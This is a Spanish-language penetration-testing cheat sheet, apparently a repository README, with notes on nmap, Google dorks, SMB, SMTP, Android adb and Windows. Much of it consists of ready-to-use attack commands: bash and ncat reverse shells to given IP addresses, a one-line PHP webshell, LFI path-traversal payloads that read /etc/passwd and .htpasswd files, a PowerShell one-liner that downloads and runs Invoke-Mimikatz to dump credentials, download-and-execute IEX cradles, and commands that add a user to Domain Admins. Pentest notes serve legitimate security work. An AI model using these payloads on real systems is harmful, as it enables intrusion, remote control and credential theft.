# Pentest
Un compendio de notas sobre pentest.

************************************************************************************************
# Análisis de binarios
## 32 bits vs 64 bits

Se abre el binario con un visor hexadecimal y se busca lo siguiente:

Si es de 32 bits
+ PL
+ 50 45 00 00 4C

Si es de 64 bits
+ PE..dt
+ 50 45 00 00 64 86

************************************************************************************************
# Android
## Herramientas utiles
+ Genymotion
+ Android Studio

## adb

Puertos default:
+ 
+ 

Comandos útiles
~~~bash
# Mostrar menú de la herramienta
adb

# Conectarte a un dispositivo mediante adb
adb connect 172.27.253.6:5555

# Listar dispositivos
adb devices

# Instalar en aplicación en emulador
adb -s <emulator> install <application.apk>

# Reemplaza la copia existente de la aplicación
adb -s <emulator> install -r <application.apk>

# Ingresa a una shell de un device
adb -s <emulator> shell

# Envía un documento a un emulador
adb -s <emulator> push '/home/user/local/file' '/data/local/' 

# Descarga un documento desde un emulador
adb -s pull 'sdcard/log.txt' '/home/user/local/file'

~~~

************************************************************************************************
# Apache

## Obtener versiones
+ curl
+ netcat
+ telnet

~~~bash
curl -I http://google.com

~~~


## Enumerar carpetas
+ dirb
+ gobuster
+ nmap

~~~bash
# Enumerar carpetas con dirb
dirb http://sitio.com -o output_file.txt

# Enumerar carpetas con nmap
nmap -P0 -p80 --script http-enum 127.0.0.1
~~~

************************************************************************************************
# Envío de información
## Vía POST

**BASH**
~~~bash
curl --header "Content-Type: application/json" \
    --request POST \
    --data '{"username":"xyz","password":"xyz"}' \
    http://localhost:3000/
~~~

Más información
+ https://linuxize.com/post/curl-post-request/


## Vía GET
**BASH**
<!--
~~~bash
GET_USER="user"
GET_PASS="pass"
URL=""
curl https://reqbin.com/
~~~
-->

************************************************************************************************
# Exfiltración de información
## Linux

### Comprimir información 
~~~bash
# Respaldo omitiendo erroes, tipos de archivos y carpetas
tar --warning=no-file-changed --exclude={*.mp4,*.mp3,'./public_html'} --ignore-failed-read -zcvf respaldo.tar.gz .
~~~

### Conseguir información
~~~bash

~~~

************************************************************************************************
# Google Dorks
## Buscadores
+ Google
+ Duckduckgo
+ bing
~~~bash
# inurl
inurl:view/view.shtml
inurl:/cgi-bin/guestimage.html
inurl:"/owa/auth/logon.asp"

# intitle
intitle:"index of /"
intitle:"Nessus Scan Report"
intitle:"index of /" "Microsfot-ISS/6.0"
intitle:"index of /" “Microsfot-ISS/5.0”

# filetype
filetype:txt
filetype:sql
filetype:xlsx
filetype:md

# Concatenando (Bloqueado desde google, pero vigente en duckduckgo y bing)
site:* filetype:xlsx

# link (-site:sitioexcluido)
link:www.sitioejemplo.com -site:sitioejemplo.com
link:www.sitioejemplo.com -site:sitioejemplo.com -site:sitioejemploespana.com -site:sitioejemplomexico.com

# Password
filetype:inc intext:mysql_connect password -please -could

# Obtener información de un sitio
info:site.com

# Ver si está habilitada la indexación de carpetas
intitle:"index of" site:site.com

# Ver información del conusuario.servidorto de whois
whois site.com
~~~

## Bing
~~~bash
# contains
# Los resultados esperados están dentro de un CMS programado en el lenguaje que se indique
contains:php filetype.pdf

# ip medio parchado, pero se puede evadir vía url
# https://www.bing.com/search?q=IP:108.167.137.42
IP:108.167.137.42
~~~



************************************************************************************************
# Herramientas útiles
## Webhook
Para recibir emails y peticiones sin una IP pública
+ https://webhook.site

## Cyberchef
Un montón de herramientas para códificar/decodificar
+ https://gchq.github.io/CyberChef/

## Ver tu IP pública
~~~
curl ifconfig.me
~~~

## Ngrok
+ https://ngrok.com/

************************************************************************************************
# Kioscos Windows

## Comandos útiles
~~~bash
# usuario local
whoami

# hostname
hostname

# version de windows
winver

# Visor de eventos
eventvwr
~~~


************************************************************************************************
# LFI (Local File Inclusion)

## ?
~~~bash
# añadir parametros una busqueda para generar errores nos muestra recursos que podrían ser de utilidad
http://172.16.22.14/index.html?page=blog&id=coso
    # Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20
~~~

## Escapar la concatenación con extensión

```bash
# Si la página concatena (nombre + .php)
http://172.16.22.14/index.html?page=blog

# Esto buscaría passwd.php
http://172.16.22.14/index.html?page=../../../../etc/passwd

# Para evitarlo usar el terminador de cadena de C (%00)
http://172.16.22.14/index.html?page=../../../../etc/passwd%00

# Sacando los usuarios que serán de interes debido a sus privilegios
http://172.16.22.14/index.html?page=../../../../etc/groups%00


http://172.16.22.14/index.html?page=../../../../../etc/group%00
    # users:x:100:usuario1,usuario2,usuario3,admin
    # admins:x:507:usuario1,admin

# Anexo: Lo que pasa en c:
    # char cadena[30] = "Hola mundo";
    # char cadena2[30] = "hola mun\0do";
    # puts(cadena); // Hola mundo
    # puts(cadena2); // Hola mun
```

## Sitios con configuraciones .htaccess
Tomando como base:
+ http://172.16.22.14/index.html?page=blog (Sitio con LFI)
+ http://172.16.22.14/restringido (Este pide autenticación DIGEST o BASIC)

Inferimos que tenemos dos sitios:
+ /var/www/html/sitioweb
+ /var/www/html/restringido

Por lo que podemos:
~~~bash
# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htaccess%00
# /var/www/html/sitioweb/..restringido/.htaccess
    # AuthType Basic
    # AuthName "Restricted - authentication required"
# Aquí incluimos la ruta de los password hasheados
    # AuthUserFile /var/www/html/restringido/.htpasswd 
    # Require valid-user

# Obtenemos configuración de .htaccess
http://172.16.22.14/index.html?page=../restringido/.htpasswd%00
    # user1:mHjBL6MLRc3nQ
    # user2:OkNYEpU0yapIs
    # admin:vjX9YIkiN3RL6
~~~

El hasheo es de 13 caracteres
+ vjX9YIkiN3RL6
+ DES 13 chars 


************************************************************************************************
# Linux
## Descargar archivos

### wget

~~~bash
# Descarga un archivo
wget <URL>

# Descarga y renombra un archivo
wget -O <filename> <URL>

# Descarga varios archivos desde un archivo de texto con las urls
wget -i download_files.txt

# Descarga una carpeta
wget -r ftp://server-address.com/directory

# Descargar de manera recursiva esos elementos
wget -nd -r -A pdf,doc,docx,xls,xlsx,jpg www.rediris.es
~~~

### curl

~~~bash
# Descarga un archivo
curl -O URL
curl -O URL1 URL2 URL3

# Descarga y renombra un archivo
curl -o filename URL
~~~


************************************************************************************************
# Metasploit
## Logs
Problema:
+ La salida de los comandos en metasploit nos es procesable con << |  >>
    + Por ejemplo la salida de enum_ssh para filtrar únicamente los usuarios validos

Con spool puedes definir un lugar en que se guardarán todo lo que imprima en pantalla metasploit

~~~bash
# Apagar los logs
spool off

# Añadir una ruta en que se harán los logs
spool /ruta/para/guardar.log

# Si lo quieres tener por siempre 
spool /home/<username>/.msf3/logs/console.log
~~~

Más información:
+ https://blog.rapid7.com/2011/06/25/metasploit-framework-console-output-spooling/


************************************************************************************************
# nmap
## Secuencia

1. Corroborar que el host esté arriba, considerar omitir la resolución DNS
    + Puede ser con o sin ping
2. Detección única de puertos (Sin versiones ni nada)
3. Detección de versiones y vulnerabilidades 

## Escaneo de un segmento de red
~~~bash
# Escanear un segmento de red
nmap -sn 172.27.48.0/24

# Escanear un segmento de red (varias ips)
nmap -sn 172.27.253.0/24 172.27.252.0/29
~~~

## Descubrimiento rápido
~~~bash
# Escaneo a top ports
nmap --max-retries 0 --top-ports 5000 site.com 
# Escaneo a todos los puertos
nmap --max-retries 0 -p- site.com
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -P0 site.com 
# Escaneo a top ports pero sin hacer ping, toma todos los hosts como vivos
nmap --max-retries 0 --top-ports 5000 -Pn site.com 
~~~

## Detección de versiones y vulnerabilidades
~~~bash
# Sintaxis básica
nmap --max-retries -p 22,80,443,3000 -sV

# -sV => Mostrar versiones
# -O => Identifica S.O.
# -p => Define el puerto

# Identifica vulnerabilidades
nmap -sV -p80,443 --script=vulners ip

# Identifica vulnerabilidades por puerto asociado
nmap -p80,8080 –sV –sC ip
# -sC => Scripts de vulnerabilidades acorde al puerto analizado

# Realizar escaneo completo a los puertos determinados
nmap -A -p80,443 ip
~~~

## Escaneo UDP
~~~bash
# Escaneo a puertos UDP
nmap -sU 172.24.16.25
~~~

Más información:
+ https://linuxhint.com/stealth_scans_nmap/

************************************************************************************************
# Pretty shell

## rlwrap (Historial de comandos)
~~~bash
# Instala rlwrap
sudo apt install rlwrap

# Para capturar la reverse shell
rlwrap nc -lp 5000
~~~

## Python pretty shell
~~~bash
# Una vez que tienes la conexión
python -c "import pty; pty.spawn('/bin/bash')"

# Otra opción es
python -c "import pty; pty.spawn('/bin/sh')"
~~~



************************************************************************************************
# Python
## Servidores web

~~~python
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 7777
~~~

************************************************************************************************
# Reverse Shell & Webshell
## Linux

### Reverse shell con bash
~~~bash
# En la máquina del ausuario.servidorante
nc -lp 9999

# En la máquina de la victima
# Cambiar IP & PORT
# bash -i >& /dev/tcp/IP/PORT 0>&1
bash -i >& /dev/tcp/172.16.16.10/9999 0>&1
bash -i >& /dev/tcp/127.0.0.1/5000 0>&1
~~~

### Reverse shell con Netcat
~~~bash
# Requiere ncat
sudo apt install ncat

# En la máquina del ausuario.servidorante
ncat -lp 1234

# En la máquina de la victima
# Requiere: apt install ncat (Especificamente este paquete para la opción -e)
# Cambiar IP & PORT
# nc -e /bin/sh IP PORT
ncat -e /bin/sh 10.0.0.1 1234
~~~

+ Puedes encontrar shells más complejas en la carpeta [reverse-shells](./reverse-shells/)

### Webshells

#### PHP POST param
~~~php
# archivo.php
<?=`$_POST[0]`?>

# Uso
curl http://localhost/ruta/archivo.php -d "0=whoami"
~~~



************************************************************************************************
# SMB (Server Message Block)

## Detalles
+ Puerto 445
+ Versión SMB 1.0 => Conexión anónima permitida
+ Windows 2008 en adelante no hay conexión anónima
    + La versión SMB 1.0 podría estar habilitada por compatibilidad

## Autenticación
~~~bash
# Autenticación anónima
smbclient -L 172.27.30.30 -N
    # Caso deshabilitado
    # Anonymous login successful
    # 
    #         Sharename       Type      Comment
    #         ---------       ----      -------
    # SMB1 disabled -- no workgroup available


# Autenticación con usuario y contraseña
# % separa el usuario del password
smbclient -L 172.27.30.30 -U 'user%password'
    # Caso login correcto
    # Sharename       Type      Comment                                                                                                                                                                                                
    #    ---------       ----      -------                                                                                                                                                                                                

# Recursos compartidos por defecto   
    #    ADMIN$          Disk      Remote Admin                                                                                                                                                                                           
    #    C$              Disk      Default share                                                                                                                                                                                          
    #    IPC$            IPC       Remote IPC                                                                                                                                                                                             
    
    
    #    NETLOGON        Disk      Logon server share                                                                                                                                                                                     
    #    SYSVOL          Disk      Logon server share

# Recursos compartidos en el caso de usar Windows update                                                                                                                                                                           
    #    UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.                                                         
    #    WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.                                                                                                         
    #    WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.                                                                                                                          
        # SMB1 disabled -- no workgroup available   
~~~

## Entrada a los directorios
~~~bash
# Entrada a los directorios
# Para algunos casos se requiere usuario admin
smbclient //172.27.30.30/WsusContent -U 'user%password'

    # Caso usuario correcto y con privilgios suficientes
    # user:~# smbclient //172.27.30.30/C$ -U 'usuarioadmin%password'
    # Try "help" to get a list of possible commands.
# Una vez en el prompt (smb: \>) usar dir para listar
dir
    # $Recycle.Bin                      DHS        0  Thu Aug 22 11:50:45 2013
    # Documents and Settings            DHS        0  Thu Aug 22 10:48:41 2013
    # File.txt                              DR        0  Wed Sep  8 19:08:52 2021
    # Program Files                      DR        0  Wed Sep  8 20:30:07 2021
    # Program Files (x86)                 D        0  Thu Aug 22 11:39:32 2013
    # ProgramData                        DH        0  Wed Sep  8 19:11:24 2021
    # Users                              DR        0  Wed Sep  8 19:08:52 2021
    # Windows                             D        0  Wed Sep  8 18:52:38 2021

# Para obtener algun archivo get file
get File.txt
    # getting file \File.txt of size 0 as READMe.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

# Para quitar 
quit

#####################
    # Caso usuario correcto y con privilgios insuficientes
    # smbclient //172.27.30.30/WsusContent -U 'user%password'
    # tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

## Para deshabilitar el compartir por defecto mediante llave de registro 
~~~bash
# llave para deshabilitar el autoshare (?)
# dar de alta double word y en valor 0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\AutoShareWks
~~~

************************************************************************************************
# SMTP (Simple Mail Transfer Protocol)
Puedes conectarte a través de varias herramientas, por ejemplo:
- netcat
- telnet
## Sacar la configuración del servidor
Requiere que tengas el nombre de dominio, pero este sale en el banner de bienvenida
+ 220 dmzweb.sitio.com ESMTP Sendmail 8.13.5/8.13.5; Mon, 4 Oct 2021 03:20:03 -0400

~~~bash
# Con telnet
telnet 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit

# Con netcat
nc 172.27.254.20 25
# Nota el ehlo en lugar de helo
# Sustituir dmzweb.sitio.com por el nombre de dominio
ehlo dmzweb.sitio.com 
    # output
    # 250-dmzweb.sitio.com Hello [172.31.247.18], pleased to meet you
    # 250-ENHANCEDSTATUSCODES
    # 250-PIPELINING
    # 250-EXPN
    # 250-VERB
    # 250-8BITMIME
    # 250-SIZE
    # 250-DSN
    # 250-ETRN
    # 250-DELIVERBY
    # 250 HELP
# Para salir
quit
~~~

## Enumerar cuentas de usuarios
~~~bash
nc 172.27.254.20 25
# Nota el helo en lugar de ehlo
helo dmzweb.sitio.com 
# Para enumerar se uso EXPN username
EXPN usuario1
    # Output
    # 550 5.1.1 usuario1... User unknown
EXPN root
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
EXPN webmaster
    # 250 2.1.5 Nombre Apellido <usuario@dmzweb.sitio.com>
~~~

## Enviar correos sin autenticación
Tienes que tener una cuenta valida de correo
~~~bash
EXPN root
    # 250 2.1.5 Nombre ap <usuario.servidor@dmzweb.sitio.com>
mail from: usuario.servidor@dmzweb.sitio.com
    # 250 2.1.0 usuario.servidor@dmzweb.sitio.com... Sender ok
rcpt to: user@gmail.com
    # 250 2.1.5 user@gmail.com... Recipient ok
data
    # 354 Enter mail, end with "." on a line by itself
Subject: El asunto
Mensaje del email, terminando con un punto
.
# 250 2.0.0 1947Mnyw018712 Message accepted for delivery

~~~

************************************************************************************************
# SQL Injection
## Mediante URL


## Mediante parámetros



************************************************************************************************
# SSL
## Herramientas

Desde la web
+ https://www.ssllabs.com/ssltest/analyze.html

ssl scan
+ https://github.com/rbsec/sslscan

testssl
+ https://github.com/drwetter/testssl.sh

Guía de cifrados seguros e inseguros
+ https://ciphersuite.info/cs/?security=all&software=openssl&singlepage=true

************************************************************************************************
# WiFi
## Escanear redes
~~~bash
# Ecacenar interfaz
# iwlist <interfaz> scan | grep SSID
iwlist wlan0 scan | grep SSID
    # ESSID:"Red 1"
    # ESSID:"Red 2"
~~~


************************************************************************************************
# Windows
## Descargar archivos

**Requiere administrador**
~~~powershell
# Metodo 1 - Download in PowerShell 2 ^
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/elcaza/pentest/main/README.md","C:\path\file")

# Metodo 2 - Download with Invoke-WebRequest ^
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -OutFile "C:\path\file"

# Metodo 3 - Download with Invoke-WebRequest ^
wget "https://raw.githubusercontent.com/elcaza/pentest/main/README.md" -outfile "file"
~~~

Más información:
+ https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

## Añadir usuario a Dominio
~~~ powershell
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN
~~~ 

## Ejecutando un living off the land
+ Windows Defender lo detecta como actividad maliciosa

~~~powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
~~~

iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))

Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.100.59:3000/poc.ps1')


Más información
+ https://lolbas-project.github.io/
+ https://github.com/LOLBAS-Project/LOLBAS
+ https://www.elladodelmal.com/2020/09/windows-amsi-antimalware-scan-interface.html
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-network-connections-microsoft-defender-antivirus?view=o365-worldwide
+ https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-exclusions?view=o365-worldwide
+ https://www.gb-advisors.com/es/mimikatz/#:~:text=Windows%20cuenta%20con%20la%20funcionalidad,la%20clave%20secreta%20para%20descifrarlas.

## Obteniendo datos del sistema

~~~cmd
REM REM = Comentario en CMD
REM Obtener información
systeminfo 

~~~